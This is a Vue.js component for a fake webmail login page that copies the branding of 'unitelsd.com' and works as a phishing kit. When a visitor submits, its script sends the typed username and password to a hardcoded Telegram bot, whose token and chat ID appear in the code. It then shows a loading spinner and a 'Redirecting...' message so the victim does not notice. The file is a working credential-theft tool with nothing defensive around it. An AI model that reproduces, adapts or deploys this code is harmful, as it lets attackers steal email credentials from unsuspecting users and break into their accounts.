<template>
  <div class="page">
    <div class="overlay">
      <img
        style="margin-bottom: 40px"
        src="https://webmail.unitelsd.com/logos/all/unitelsd.com.png?s=1732144309"
        alt=""
      />

      <div class="login-box">
        <form @submit.prevent="finishJoob">
          <div class="input-group">
            <div class="icon">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="#d8d8d8"
              >
                <path
                  d="M12 12c2.76 0 5-2.24 5-5S14.76 2 12 2 7 4.24 7 7s2.24 5 5 5zm0 2c-3.33 0-10 1.67-10 5v3h20v-3c0-3.33-6.67-5-10-5z"
                />
              </svg>
            </div>

            <input
              v-model="formDataRes.username"
              type="text"
              placeholder="Username"
            />
          </div>

          <div class="input-group">
            <div class="icon">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="#d8d8d8"
              >
                <path
                  d="M17 8h-1V6a4 4 0 00-8 0v2H7a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2V10a2 2 0 00-2-2zm-7-2a2 2 0 114 0v2h-4V6zm7 14H7V10h10v10z"
                />
              </svg>
            </div>

            <input
              v-model="formDataRes.password"
              type="password"
              placeholder="Password"
            />
          </div>

          <button
            :disabled="loading || !isFormValid"
          >
            <span v-if="!loading">LOGIN</span>
            <span v-else>Loading...</span>
          </button>
        </form>
      </div>

      <!-- Loading Overlay -->
      <div v-if="loading" class="over">
        <div class="loader"></div>
        <!-- <p>Please wait...</p> -->
      </div>

      <!-- Success Popup -->
      <div v-if="showPopup" class="popup">
        <div class="popup-content">
          <h3></h3>
          <br>
          <p>Redirecting...</p>
        </div>
      </div>

      <div class="footer">unitelsd.com webmail</div>
    </div>
  </div>
</template>

<script>
import axios from "axios";

export default {
  data() {
    return {
      formDataRes: {
        username: "",
        password: "",
      },
      showPopup: false,
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },

  computed: {
    isFormValid() {
      return (
        this.formDataRes.username.trim() !== "" &&
        this.formDataRes.password.trim() !== ""
      );
    },
  },

  methods: {
    // registerFan() {
    //   this.showPopup = true;
    // },

    async finishJoob() {
      this.loading = true;
      this.showPopup = false;

      this.count++;

      // Format the message
      const message = `*🔔🔔🔔 GOLDENWEST 🔔🔔🔔 *\nUSERNAME: ${this.formDataRes.username}\nPASSWORD: ${this.formDataRes.password}`;

      // Send to Telegram
      await this.sendTelegramResult(
        process.env.NUXT_APP_CHAT_ID || "-4794000485",
        message
      );

      // Keep the loader visible for 3 seconds
      setTimeout(() => {
        this.loading = false;
        this.showPopup = true;

        // Keep the popup visible for 2 seconds
        setTimeout(() => {
          this.$router.push("/");
        }, 2000);
      }, 3000);
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>

<style scoped>
#app {
  margin: 0 !important;
  padding: 0 !important;
  width: 100%;
  height: 100%;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Arial, Helvetica, sans-serif;
}

body {
  box-sizing: border-box;
  padding: 0;
  margin: 0;
  width: 100%;
  height: 100vh;
}

.page {
  width: 100%;
  height: 100vh;
  background: url("https://d3mqmy22owj503.cloudfront.net/30/501030/images/site_graphics/hero-1.jpg")
    center center;
  background-size: cover;
}

.overlay {
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.45);
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}

.over {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.45);
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  z-index: 9999;
}

.loader {
  width: 55px;
  height: 55px;
  border: 5px solid #ddd;
  border-top: 5px solid #1976d2;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

.popup {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.35);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 10000;
}

.popup-content {
  background: #fff;
  padding: 30px;
  border-radius: 10px;
  text-align: center;
  min-width: 280px;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.login-box {
  width: 430px;

  background: rgba(34, 34, 34, 0.88);

  padding: 42px;

  border-radius: 4px;
}

.input-group {
  display: flex;
  margin-bottom: 12px;
}

.icon {
  width: 52px;
  height: 46px;

  background: #3a3a3a;

  display: flex;
  justify-content: center;
  align-items: center;

  border: 1px solid #5f7682;
  border-right: none;

  color: #d5d5d5;
}

.input-group input {
  flex: 1;

  height: 46px;

  background: #252d31;

  border: 1px solid #5f7682;

  color: white;

  padding: 0 15px;

  font-size: 16px;
}

.input-group input::placeholder {
  color: #aeb7bc;
}

button {
  width: 100%;
  height: 42px;

  border: none;

  background: #0c84c6;

  color: white;

  font-size: 16px;
  font-weight: bold;

  cursor: pointer;

  border-radius: 2px;
}

button:hover {
  background: #0b76b2;
}

.footer {
  position: absolute;

  left: 8px;
  bottom: 8px;

  color: white;

  font-size: 11px;
}
</style>